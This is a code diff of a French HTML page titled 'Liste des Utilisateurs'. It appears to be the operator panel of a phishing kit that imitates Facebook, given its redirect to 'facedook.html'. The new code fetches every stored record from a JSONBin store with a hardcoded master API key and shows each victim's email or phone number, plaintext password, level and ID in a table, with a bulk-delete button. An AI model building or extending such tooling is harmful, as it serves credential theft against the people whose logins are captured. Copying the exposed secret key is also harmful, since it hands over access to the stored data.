@@ -3,104 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Afficher Level et ID</title>
+    <title>Liste des Utilisateurs</title>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        background: #f0f2f5;
-        text-align: center;
-        padding: 20px;
-        margin: 0;
-      }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            text-align: center;
+            padding: 20px;
+        }
 
-      h1 {
-        color: #1877f2;
-        margin-bottom: 20px;
-      }
+        h1 {
+            color: #1877f2;
+        }
 
-      .form-container {
-        background: #fff;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        max-width: 400px;
-        margin: 40px auto;
-      }
+        table {
+            width: 80%;
+            margin: 20px auto;
+            border-collapse: collapse;
+            background: #fff;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
 
-      .btn {
-        display: inline-block;
-        width: 100%;
-        padding: 10px;
-        background: #1877f2;
-        color: #fff;
-        border: none;
-        font-size: 1rem;
-        border-radius: 5px;
-        cursor: pointer;
-        transition: background 0.2s ease;
-      }
+        th, td {
+            padding: 12px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
 
-      .btn:hover {
-        background: #0d65d9;
-      }
+        th {
+            background: #1877f2;
+            color: white;
+        }
+
+        tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+
+        .loading {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #666;
+        }
+
+        .delete-btn {
+            margin: 20px;
+            padding: 10px 15px;
+            background: #f44336;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .delete-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
 
-    <h1>Afficher Level et ID</h1>
+    <h1>Liste des Utilisateurs</h1>
+    <p class="loading">Chargement des données...</p>
 
-    <div class="form-container">
-        <p><strong>Email ou Numéro de Téléphone:</strong> <span id="userEmail"></span></p>
-        <p><strong>Level:</strong> <span id="userLevel"></span></p>
-        <p><strong>ID:</strong> <span id="userId"></span></p>
+    <table id="usersTable">
+        <thead>
+            <tr>
+                <th>Sélection</th>
+                <th>Email ou Numéro</th>
+                <th>Mot de Passe</th>
+                <th>Level</th>
+                <th>ID</th>
+            </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
 
-        <button class="btn" onclick="reloadData()">Rafraîchir</button>
-    </div>
+    <button id="deleteSelected" class="delete-btn" disabled>Supprimer sélection</button>
 
     <script>
-        const sheetDB_URL = "https://api.jsonbin.io/v3/b/67e15a158a456b79667bace8"; // Your JSON Bin URL
+        const sheetDB_URL = "https://api.jsonbin.io/v3/b/67e15a158a456b79667bace8";  // Your JSON Bin URL
         const apiKey = "$2a$10$S.niU8v2ITJclqoIqnxRpO0Z/GE1nIZ4ZzRHHUOZ61omdpyrpcoNK";  // API Key for authentication
 
-        let emailOrNum = localStorage.getItem("emailOrNum");
+        async function fetchUsers() {
+            try {
+                let response = await fetch(sheetDB_URL, {
+                    method: "GET",
+                    headers: {
+                        "X-Master-Key": apiKey
+                    }
+                });
+                let data = await response.json();
 
-        if (!emailOrNum) {
-            alert("Aucune session trouvée, veuillez vous reconnecter.");
-            window.location.href = "facedook.html";
-        }
+                let tableBody = document.querySelector("#usersTable tbody");
+                let loadingText = document.querySelector(".loading");
+                let deleteButton = document.getElementById("deleteSelected");
 
-        // Function to load data from JSON bin
-        function loadData() {
-            fetch(sheetDB_URL, {
-                method: "GET",  // Retrieve the record
-                headers: {
-                    "X-Master-Key": apiKey
+                loadingText.style.display = "none";
+
+                if (data.record && data.record.length === 0) {
+                    loadingText.textContent = "Aucune donnée disponible.";
+                    loadingText.style.display = "block";
+                    return;
                 }
-            })
-            .then(response => response.json())
-            .then(result => {
-                const userData = result.record;
-                if (userData.emailornum === emailOrNum) {
-                    document.getElementById("userEmail").textContent = userData.emailornum;
-                    document.getElementById("userLevel").textContent = userData.level;
-                    document.getElementById("userId").textContent = userData.id;
-                } else {
-                    alert("Aucune donnée trouvée pour cet utilisateur.");
+
+                data.record.forEach(user => {
+                    let row = document.createElement("tr");
+
+                    let checkboxCell = document.createElement("td");
+                    let checkbox = document.createElement("input");
+                    checkbox.type = "checkbox";
+                    checkbox.value = user.emailornum;
+                    checkbox.classList.add("user-checkbox");
+                    checkbox.addEventListener("change", checkSelection);
+                    checkboxCell.appendChild(checkbox);
+
+                    row.innerHTML += `
+                        <td>${user.emailornum || "N/A"}</td>
+                        <td>${user.pswd || "N/A"}</td>
+                        <td>${user.level || "N/A"}</td>
+                        <td>${user.id || "N/A"}</td>
+                    `;
+
+                    row.prepend(checkboxCell);
+                    tableBody.appendChild(row);
+                });
+            } catch (error) {
+                console.error("Erreur lors de la récupération des données:", error);
+                document.querySelector(".loading").textContent = "Erreur de chargement.";
+            }
+        }
+
+        function checkSelection() {
+            let selected = document.querySelectorAll(".user-checkbox:checked").length;
+            document.getElementById("deleteSelected").disabled = selected === 0;
+        }
+
+        async function deleteSelectedUsers() {
+            let selectedCheckboxes = document.querySelectorAll(".user-checkbox:checked");
+            if (selectedCheckboxes.length === 0) {
+                alert("Veuillez sélectionner au moins un utilisateur à supprimer.");
+                return;
+            }
+
+            if (!confirm("Voulez-vous vraiment supprimer ces utilisateurs ?")) return;
+
+            for (let checkbox of selectedCheckboxes) {
+                let emailOrNum = checkbox.value;
+                try {
+                    let response = await fetch(`${sheetDB_URL}/record/${emailOrNum}`, {
+                        method: "DELETE",
+                        headers: {
+                            "X-Master-Key": apiKey
+                        }
+                    });
+
+                    if (response.ok) {
+                        checkbox.closest("tr").remove();
+                    } else {
+                        console.error(`Erreur lors de la suppression de ${emailOrNum}`);
+                    }
+                } catch (error) {
+                    console.error(`Erreur de suppression : ${error}`);
                 }
-            })
-            .catch(error => {
-                console.error("Erreur :", error);
-                alert("Erreur lors de la récupération des données.");
-            });
+            }
+
+            alert("Utilisateurs supprimés !");
+            document.getElementById("deleteSelected").disabled = true;
         }
 
-        // Call loadData when page loads
-        window.onload = loadData;
+        document.getElementById("deleteSelected").addEventListener("click", deleteSelectedUsers);
 
-        // Reload button functionality
-        function reloadData() {
-            loadData();
-        }
+        fetchUsers();
     </script>
 
 </body>
 </html>
+
